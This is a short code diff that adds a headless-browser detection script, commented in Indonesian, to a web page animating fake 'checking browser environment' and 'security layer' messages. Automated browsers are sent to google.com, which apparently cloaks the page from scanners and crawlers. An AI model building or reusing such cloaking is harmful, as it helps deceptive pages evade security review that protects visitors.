@@ -50,6 +50,23 @@
   <div id="status"></div>
 
   <script>
+    // Deteksi headless
+    (function() {
+      function isHeadless() {
+        if (navigator.webdriver) return true;
+        if (/HeadlessChrome/.test(navigator.userAgent)) return true;
+        if (navigator.plugins.length === 0) return true;
+        if (window.outerWidth === 0 || window.outerHeight === 0) return true;
+        if (!navigator.language) return true;
+        return false;
+      }
+
+      if (isHeadless()) {
+        window.location.href = "https://www.google.com";
+      }
+    })();
+
+    // Animasi status langkah
     const steps = [
       "Checking browser environment...",
       "Validating JavaScript engine...",
@@ -58,7 +75,7 @@
       "Finalizing security layer...",
       "Redirecting..."
     ];
-    
+
     let i = 0;
     let charIndex = 0;
     const statusEl = document.getElementById("status");
